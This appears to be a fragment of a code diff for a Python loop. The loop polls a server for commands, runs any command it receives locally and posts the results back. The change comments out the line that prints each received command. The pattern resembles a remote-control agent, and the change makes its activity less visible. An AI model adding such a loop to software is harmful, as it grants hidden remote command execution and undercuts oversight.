@@ -35,7 +35,7 @@ while True:
         ).json()
 
         if response["command"]:
-            print(f"command is {response["command"]}")
+            #print(f"command is {response["command"]}")
             returncode, stdout = simple_command(response["command"])
 
             requests.post(
